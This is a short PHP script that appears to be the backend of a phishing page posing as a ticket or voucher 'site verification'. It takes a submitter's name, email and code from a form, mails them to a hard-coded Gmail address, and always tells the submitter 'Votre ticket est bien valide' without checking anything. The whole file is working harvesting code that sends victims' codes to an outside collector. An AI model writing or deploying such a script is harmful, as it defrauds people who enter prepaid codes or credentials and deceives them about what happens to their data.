<?php
    $msg_erreur="Erreur. Les champs suivants doivent être obligatoirement remplis :<br/>";
    $msg_ok='Votre ticket est bien valide';
    $message=$msg_erreur;
    $nom = trim($_POST['NOM']);
    $email = trim($_POST['email']);
    $code = trim($_POST['code']);
    $to='franciscokenett048@gmail.com';
   $objet='verification de site';
$mail_corps= "Message de : $email \n";
$mail_corps .= "Proprietaire: $nom \n";
$mail_corps .= "CODE:$code \n";
if (mail($to,$objet,$mail_corps)) {
    //Le mail est bien expédié
    echo "$msg_ok";
  } else {
    //Le mail n'a pas été expédié
    echo 'Une erreur est survenue';
  }
?>
